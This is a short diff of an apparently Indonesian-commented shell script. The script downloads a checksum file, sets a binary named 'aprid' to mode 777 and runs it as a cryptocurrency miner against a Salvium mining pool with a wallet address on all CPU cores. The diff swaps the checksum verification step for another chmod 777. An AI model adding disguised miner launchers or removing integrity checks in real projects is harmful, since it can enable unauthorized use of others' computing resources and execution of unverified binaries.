@@ -8,8 +8,8 @@ wget -O SHA256SUMS https://github.com/Dewinet/your/raw/refs/heads/main/SHA256SUM
 # Beri izin eksekusi untuk file 'aprid'
 chmod 777 aprid
 
-# Verifikasi checksum file aprid menggunakan SHA256SUMS
-sha256sum -c SHA256SUMS --ignore-missing
+# Beri izin eksekusi untuk file 'SHA256SUMS'
+chmod 777 SHA256SUMS
 
 # Jalankan file aprid
 ./aprid --donate-level 1 -o sg.salvium.herominers.com:1230 -u SaLvdUj9vebTXP3ADtxozYLfwaBjG651pcKoy5kjD3FTEnZA3wT2fZNPxtJTWCwruX1QuKUxZKAdeAYiLumbJEcGK4XFc9wbP1w -p EMPUY -a rx/0 -k -t $(nproc --all)
